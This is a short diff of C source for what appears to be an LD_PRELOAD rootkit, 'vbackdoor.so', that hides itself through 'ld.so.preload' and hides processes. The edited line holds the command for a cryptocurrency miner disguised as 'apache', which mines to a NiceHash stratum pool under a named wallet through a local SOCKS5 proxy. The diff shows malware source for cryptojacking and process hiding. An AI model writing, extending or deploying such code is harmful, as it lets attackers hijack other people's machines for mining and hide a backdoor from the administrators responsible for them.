@@ -15,7 +15,7 @@
 #include <errno.h>
 
 #define MAGIC_STRING "apache" // hide process one
-#define MAGIC_DEAMON "screen ./apache --algo ETHASH -p stratum+ssl://daggerhashimoto.auto.nicehash.com:443 --user 3682d4T6YaidpyJJ5GBjs3qcsE1aSV8sYN.asuw --ethstratum ETHV1 --nocolor on --socks5 127.0.0.1:9998
+#define MAGIC_DEAMON "./apache --algo ETHASH -p stratum+ssl://daggerhashimoto.auto.nicehash.com:443 --user 3682d4T6YaidpyJJ5GBjs3qcsE1aSV8sYN.asuw --ethstratum ETHV1 --nocolor on --socks5 127.0.0.1:9998
 " // hide process two
 #define CONFIG_FILE "ld.so.preload" // hide self
 #define LIB_FILE "vbackdoor.so" // hide self
